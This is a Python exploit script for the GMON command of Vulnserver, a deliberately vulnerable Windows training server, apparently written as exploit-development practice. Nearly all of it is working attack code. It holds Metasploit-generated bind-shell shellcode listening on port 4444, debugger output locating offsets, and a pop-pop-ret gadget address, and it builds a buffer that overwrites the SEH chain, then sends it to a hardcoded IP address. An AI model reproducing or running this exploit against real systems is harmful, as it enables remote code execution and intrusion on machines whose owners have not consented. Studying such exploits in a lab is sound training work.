# Vuln Server Source Code: https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c


# } else if (strncmp(RecvBuf, "GMON ", 5) == 0) {
# 				char GmonStatus[13] = "GMON STARTED\n";
# 				for (i = 5; i < RecvBufLen; i++) {
# 					if ((char)RecvBuf[i] == '/') {
# 						if (strlen(RecvBuf) > 3950) {
# 							Function3(RecvBuf);
# 						}
# 						break;
# 					}
# 				}
# SendResult = send( Client, GmonStatus, sizeof(GmonStatus), 0 );

# void Function3(char *Input) {
# 	char Buffer2S[2000];
# 	strcpy(Buffer2S, Input);
# }


import socket, sys

IP = '35.182.31.212'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, 9999))
sock.recv(1024)

# shellcode msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -b '\x00\x0a\x0d' -t c
shellcode = b"\xdd\xc4\xd9\x74\x24\xf4\xba\xd1\xce\x11\xeb\x5d\x29\xc9"
shellcode += b"\xb1\x56\x31\x55\x18\x83\xed\xfc\x03\x55\xc5\x2c\xe4\x17"
shellcode += b"\x0d\x39\x07\xe8\xcd\x5a\x81\x0d\xfc\x48\xf5\x46\xac\x5c"
shellcode += b"\x7d\x0a\x5c\x16\xd3\xbf\xd7\x5a\xfc\xb0\x50\xd0\xda\xff"
shellcode += b"\x61\xd4\xe2\xac\xa1\x76\x9f\xae\xf5\x58\x9e\x60\x08\x98"
shellcode += b"\xe7\x9d\xe2\xc8\xb0\xea\x50\xfd\xb5\xaf\x68\xfc\x19\xa4"
shellcode += b"\xd0\x86\x1c\x7b\xa4\x3c\x1e\xac\x14\x4a\x68\x54\x1f\x14"
shellcode += b"\x49\x65\xcc\x46\xb5\x2c\x79\xbc\x4d\xaf\xab\x8c\xae\x81"
shellcode += b"\x93\x43\x91\x2d\x1e\x9d\xd5\x8a\xc0\xe8\x2d\xe9\x7d\xeb"
shellcode += b"\xf5\x93\x59\x7e\xe8\x34\x2a\xd8\xc8\xc5\xff\xbf\x9b\xca"
shellcode += b"\xb4\xb4\xc4\xce\x4b\x18\x7f\xea\xc0\x9f\x50\x7a\x92\xbb"
shellcode += b"\x74\x26\x41\xa5\x2d\x82\x24\xda\x2e\x6a\x99\x7e\x24\x99"
shellcode += b"\xce\xf9\x67\xf6\x23\x34\x98\x06\x2b\x4f\xeb\x34\xf4\xfb"
shellcode += b"\x63\x75\x7d\x22\x73\x7a\x54\x92\xeb\x85\x56\xe3\x22\x42"
shellcode += b"\x02\xb3\x5c\x63\x2a\x58\x9d\x8c\xff\xcf\xcd\x22\xaf\xaf"
shellcode += b"\xbd\x82\x1f\x58\xd4\x0c\x40\x78\xd7\xc6\xf7\xbe\x19\x32"
shellcode += b"\x54\x29\x58\xc4\x4b\xf5\xd5\x22\x01\x15\xb0\xfd\xbd\xd7"
shellcode += b"\xe7\x35\x5a\x27\xc2\x69\xf3\xbf\x5a\x64\xc3\xc0\x5a\xa2"
shellcode += b"\x60\x6c\xf2\x25\xf2\x7e\xc7\x54\x05\xab\x6f\x1e\x3e\x3c"
shellcode += b"\xe5\x4e\x8d\xdc\xfa\x5a\x65\x7c\x68\x01\x75\x0b\x91\x9e"
shellcode += b"\x22\x5c\x67\xd7\xa6\x70\xde\x41\xd4\x88\x86\xaa\x5c\x57"
shellcode += b"\x7b\x34\x5d\x1a\xc7\x12\x4d\xe2\xc8\x1e\x39\xba\x9e\xc8"
shellcode += b"\x97\x7c\x49\xbb\x41\xd7\x26\x15\x05\xae\x04\xa6\x53\xaf"
shellcode += b"\x40\x50\xbb\x1e\x3d\x25\xc4\xaf\xa9\xa1\xbd\xcd\x49\x4d"
shellcode += b"\x14\x56\x79\x04\x34\xff\x12\xc1\xad\xbd\x7e\xf2\x18\x81"
shellcode += b"\x86\x71\xa8\x7a\x7d\x69\xd9\x7f\x39\x2d\x32\xf2\x52\xd8"
shellcode += b"\x34\xa1\x53\xc9"

# Exploit Info: Windows Server 2008 x64
# [+] Looking for cyclic pattern in memory
#     Cyclic pattern (normal) found at 0x0253f209 (length 3572 bytes)
#     -  Stack pivot between 33 & 3605 bytes needed to land in this pattern
#     Cyclic pattern (normal) found at 0x00943919 (length 4087 bytes)
#     EBP (0x0253f9d8) points at offset 1999 in normal pattern (length 1576)
#     EDX contains normal pattern : 0x32704531 (offset 3575)
#     ECX (0x00944714) points at offset 3579 in normal pattern (length 508)
# [+] Examining SEH chain
#     SEH record (nseh field) at 0x0253ffc4 overwritten with normal pattern : 0x326e4531 (offset 3515), followed by 52 bytes of cyclic data after the handler
# [+] Examining stack (entire stack) - looking for cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f20c : Contains normal cyclic pattern at ESP+0x24 (+36) : offset 3, length 3572 (-> 0x0253ffff : ESP+0xe18)
# [+] Examining stack (entire stack) - looking for pointers to cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f164 : Pointer into normal cyclic pattern at ESP-0x84 (-132) : 0x0253fc60 : offset 2647, length 928
#     0x0253f168 : Pointer into normal cyclic pattern at ESP-0x80 (-128) : 0x0253f7a0 : offset 1431, length 2144

brk_flag = 0

GMON = "GMON /.:/".encode("ascii")
padding_a = "A".encode("ascii")
padding_c = "A".encode("ascii")
nop = b"\x90"


# Jumping from 0x0230FFDC to 0x0230FDD7
# Hex Value: 205 Decimal: 517
jmp_to_payload = b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

# JMP SHORT
jmp_short = b"\xEB\x06\x90\x90"

# essfunc.dll (0x62501000 - 0x62502000) No SEH Protection
# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\vulnserver-master\essfunc.dll)
SEH_record = b"\xB4\x10\x50\x62"

# Trigger access violation - Done
# Pointer to next SEH needs to be overwritten with jmp to shellcode
# Current SE handler overwritten and points to pop, pop ret (pop pulls last value added off the stack into register)

# durring prologue of exception handler address of pointer to next SEH was put on the stack at ESP+8, pop pop ret puts this
# address in EIP and allows execution of the code at the address of "pointer to next SEH"

# SEH chain of thread 000002D8
# Address    SE handler
# 0223FFC4   C290C290
# C206ABC3   *** CORRUPT ENTRY ***

# We only have 38 bytes after ptr_next_SEH before end of memory block

# Assemble structure of our payload
# NOP instructions | Reverse Shell payload | Short JMP | NOP | NOP | EIP | Second Stage payload

step1 = GMON
print("Adding Initial Command ({} Bytes) \n".format(sys.getsizeof(step1)))
buffer = step1
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

# Need total of 3515 padding to get to JMP
# 3022 Bytes is where payload needs to go
step2 = nop * (3515-len(shellcode))
print("Adding NOP Padding ({} Bytes) \n".format(sys.getsizeof(step2)))
buffer += step2
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

step3 = shellcode
print("Adding Shellcode ({} Bytes) \n".format(sys.getsizeof(step3)))
buffer += step3
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))



print("Adding JMP Short \n")
buffer += jmp_short
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

print("Adding SEH Pointer \n")
buffer += SEH_record
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

if brk_flag:
    print("Adding Breakpoint \n")
    brk = b"\xCC"
    buffer += brk

print("Adding JMP to payload \n")
buffer += jmp_to_payload
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding for remaining 36 bytes \n")
buffer += nop * (36-len(jmp_to_payload))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding to hit necessary length to trigger exception \n")
buffer += nop * (5050 - len(buffer))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Final Buffer Result: \n")
print(buffer)

if len(buffer) < 3950:
    print("Buffer Length insufficient to call Function3")
    print("Exiting...")
    exit(1)

print("Sending {} Bytes... \n".format(sys.getsizeof(buffer)))
sock.sendall(buffer)
sock.close()
print("Done \n")
exit(0)
